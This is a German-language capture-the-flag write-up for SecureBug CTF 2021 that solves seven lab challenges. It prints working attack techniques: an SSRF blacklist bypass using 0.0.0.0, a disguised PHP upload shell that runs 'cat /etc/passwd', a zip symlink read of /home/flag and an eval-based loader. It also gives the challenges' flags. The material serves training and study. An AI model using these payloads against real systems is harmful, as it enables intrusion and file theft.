# SecureBug CTF 2021

## Challenge #1 ([Mr. Doom](http://ec2-18-184-207-28.eu-central-1.compute.amazonaws.com/doom/)) (easy)
Versteck in `/jquery-assets.js` befindet sich folgendes JS:
```js
eval(function(p, a, c, k, e, r) {
    e = function(c) {
        return c.toString(a)
    };
    if (!''.replace(/^/, String)) {
        while (c--)
            r[e(c)] = k[c] || e(c);
        k = [function(e) {
            return r[e]
        }];
        e = function() {
            return '\\w+'
        };
        c = 1
    };
    while (c--)
        if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
    return p
}('1 0=2.3(\'4\').5;$.6({7:"8",9:"c.d",e:{"0":0},f:g(a,b){h(a)}});', 18, 18, 'tmp|var|document|getElementById|string|value|ajax|type|POST|url|||Tc5IQib027qvyjSMfHjOMaLk|php|data|success|function|eval'.split('|'), 0, {}))
```
Das `eval()` führt folgenden Code aus:
```js
var tmp = document.getElementById('string').value;
$.ajax(
    {
        type: "POST",
        url: "Tc5IQib027qvyjSMfHjOMaLk.php",
        data: { "tmp": tmp },
        success: function(a,b) { eval(a) }
    }
);
```

```
0  |1  |2       |3             |4     |5    |6   |7   |8   |9  
tmp|var|document|getElementById|string|value|ajax|type|POST|url

a|b|c                       |d  |e   |f      |g       |h
 |||Tc5IQib027qvyjSMfHjOMaLk|php|data|success|function|eval
```
Das `eval()` hat keine Relevanz. Es dient lediglich als Mechanismus um bei korrekter Eingabe die Flag auszugeben. Die Flag befindet sich damit aufseiten des Servers.

### Limitations

String muss eine ```#``` beinhalten

slice 1 muss regex erfüllen: ```/^[a-zA-Z\[\]']*$/```

slice 1 muss dies vervollständigen
```javascript=
document['create
```

slice 1 muss evt eine js function sein mit einem object 'userdata'als Parameter

## Challenge #2 ([Flag Script](http://18.194.166.81/flagscript/)) (easy)
Es gibt eine Referenz auf eine externe JS-Datei namens flagscript.js. In der Datei ist highly obfuscated JS Code.
Irgendwo in der Datei gibt es eine Variable namens "flag" (~Zeile 81):
```js
// ...

flag = a[_0x26ff06(367)](fv, c, d, e, f, g, bg, i, j, k, xx, m, n, o, jj, q, r, s, kk, u, ab);
console[_0x26ff06(378)](flag);

// ...
```
Mit dem Debugger kann man dann während das Skript ausgeführt wird in die Zeile springen und die Flag auslesen:
```
SBCTF{n0t_a_nice_code}
```

## Challenge #3 (Misplaced) (easy)
Wir kriegen eine Datei `file.what`. Diese hat extended attributes gesetzt:
```bash
$ ls -@al file.what 

-rw-r--r--@ 1 michel  staff  3428330 Feb 16 18:46 file.what
	com.apple.metadata:kMDItemWhereFroms	    446 
	com.apple.quarantine	     76 
```
Das ist was Browser/Apple spezifisches also egal. Das gehört nicht zur Challenge.

Wenn man das Tool `binwalk` auf die Datei anwendet kriegt man folgendes Ergebnis:
```
$ binwalk file.what -e 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
1048576       0x100000        Zip archive data, encrypted at least v2.0 to extract, compressed size: 282364, uncompressed size: 287052, name: Article1.jpg
1331114       0x144FAA        End of Zip archive, footer length: 64, comment: "Password: 3a24869a641d60c09ceb71af4f99cffc"
```
Mithilfe der Option "-e" wurden die Datei auch gleich extrahiert. Man kann die ZIP-Datei nun mit jedem beliebigen Tool öffnen und das Passwort zum entschlüsseln mit angeben.

Nun bekommen wir eine JPG-Datei. Wirft man einen Blick mit dem Tool `file` auf ie Datei dann erkennen wir das es sich tatsächlich um ein Microsoft Word 2007 Dokument handelt. 

Wir benennen die Datei um und öffnen sie in Word. Darin befindet sich die Flag:
```
SBCTF{n1c3_c4rv1n6_w3ll_d0n3}
```

## Challenge #4 ([STASHED](http://ec2-35-159-53-53.eu-central-1.compute.amazonaws.com/stashed/?)) (medium)
Es handelt sich um eine Seite die andere Seiten scraped.

Wir geben als URL `http://info.mainrs.de/index.php` an und kriegen folgende Informationen ausgegeben:
```
HTTP_USER_AGENT = Mozilla/5.0 (SafeCurl)
REMOTE_ADDR = 35.159.53.53
```
Die IP-Adresse ist nicht unsere also werden die Seiten serverseitig gescraped. 

Sucht man nach `SafeCurl` findet man eine [PHP-Library die CURL wrapped](https://github.com/wkcaj/safecurl). In der Library wird von Blacklists/Whitelists für private IP-Adressen geredet. Einmal alle ausprobiert:
```
127.0.0.1 => blacklisted
172.16.0.0 => blacklisted
192.168.0.0 => blacklisted
10.0.0.0 => blacklisted
```

Versucht man die Seite mit ihrer eigenen URL aufzurufen kriegt man ebenso eine Blacklist-Response.
```
Provided host 'ec2-35-159-53-53.eu-central-1.compute.amazonaws.com'
resolves to '172.31.16.223', which matches a blacklisted value: 172.16.0.0/12
```

Was allerdings funktioniert ist die IP `0.0.0.0`. Damit kriegen wir den Quelltext der aktuellen Seite ausgeliefert.

Die Challenge hatte folgende Beschreibung:
```
Do not exhaust yourself and just follow robots.txt
```

Wir versuchen folgende URLs:
```
http://ec2-35-159-53-53.eu-central-1.compute.amazonaws.com/stashed/robots.txt => 404
http://ec2-35-159-53-53.eu-central-1.compute.amazonaws.com/robots.txt => 404
http://0.0.0.0/robots.txt => 200
```
Der Inhalt der `robots.txt`:
```
User-agent: *
Disallow: super_secret_flag_for_new_year_ctf
```
Die Ausgabe von `http://0.0.0.0/super_secret_flag_for_new_year_ctf`:
```
FLAG{h4ppy_n3w_y34r_2021} 
```

## Challenge #5 ([Trojan Horse](http://18.194.166.81/trojan/)) (medium)
Wir können Dateien hochladen.

Lädt man die Datei mit dem Namen `test.php` hoch kommt folgender Fehler:
```
Your Artwork was not uploaded. Invalid extension.
```

Lädt man die Datei mit dem Namen `test.jpg.php` hoch kommt folgender Fehler:
```
Your Artwork was not uploaded. Invalid type.
```
Es wird also nur geguckt ob `.jpg` im Dateinamen enthalten ist und nicht ob er darauf endet. Ebenso wird das Format überprüft. Aber wie?

Probehalber senden wir eine Datei mit dem Namen `test.jpg.php` die die JPG magic bytes "FF D8" enthält:
```bash
echo -en "\xFF\xD8\n<?php\nvar_dump(\$_SERVER);" > test.jpg.php
```
Diese wird allerdings auch abgelehnt. Grund dafür ist anscheinend der MIME-Type der automatisch vom Browser gesetzt wird (`Content-Type: text/php`). Setzt man diesen auf `image/jpeg` wird die Datei akzeptiert und als PHP-Datei mit PHP-Extension gespeichert.

```
-----------------------------200211931521742592722360568165
Content-Disposition: form-data; name="name"

test
-----------------------------200211931521742592722360568165
Content-Disposition: form-data; name="email"

test@email.org
-----------------------------200211931521742592722360568165
Content-Disposition: form-data; name="image"; filename="test3.jpg.php"
Content-Type: image/jpeg

<?php $r=null;$o=null;exec('cat /etc/passwd',$0,$r);print_r($o);

-----------------------------200211931521742592722360568165
Content-Disposition: form-data; name="submit"

Submit
-----------------------------200211931521742592722360568165--
```

Ruft man die zurückgegebene URL nun über den Webbrowser auf, so wird das PHP-Skript ausgeführt und gibt den Inhalt von `/etc/passwd` zurück. Dort befindet sich die Flag:
```
SBCTF{unr3s7r1c73d_f1l3_upl04d_1s_d4ng3r0us}
```

## Challenge #6 (Nice Duck!) (medium)
Wir haben eine `pcapng`-Datei bekommen. Diese kann man mit Wireshark öffnen.

Es gibt mehrere interessante Requests die Credentials in der Payload haben:
```
POST /index.php?p=
HOST: localhost

fm_usr=admin&fm_pwd=admin123
```

```
GET /index.php?p=&view=movie.mp4 HTTP/1.1
HOST: localhost
Cookie: filemanager=69o8kcauteetsc2qpr8htduv5s
```
Metainformationen:
- Lokale Entwicklung mit XAMPP
- WebRoot ist 'C:/xampp/htdocs'
- PHP 8.0
- Es wird ein Video heruntergeladen

Wir können das Video mithilfe von Wireshark extrahieren und es uns angucken. In dem Video steht die Flag:
```
SBCTF{1n53cur3_commun1c471on}
```

## Challenge #7 ([Upgrade](http://18.184.207.28:3334/)) (hard)
Symlinks und robots.txt. Die Datei muss `source` heißen.

```
ln -s /home/flag source
zip --symlinks -r upgrade.zip source
```

```
User-agent: *

Disallow: /uploads
Disallow: /home/flag
```

```
The file upgrade.zip has been uploaded.

 
index.html 635
robots.txt 54
style.css 2.4K
upload.php 2.2K
uploads 12K
Archive:  uploads/d66a632a81d881df2c5b6ed4e8ad2d3d.zip
    linking: uploads/d66a632a81d881df2c5b6ed4e8ad2d3d/source  -> /home/flag 
finishing deferred symbolic links:
  uploads/d66a632a81d881df2c5b6ed4e8ad2d3d/source -> /home/flag


source file :
$ cat uploads/d66a632a81d881df2c5b6ed4e8ad2d3d/source

FLAG{zIp_aNd_sYmLinkS_arE_S0_rIskY} 
```

```
FLAG{zIp_aNd_sYmLinkS_arE_S0_rIskY} 
```
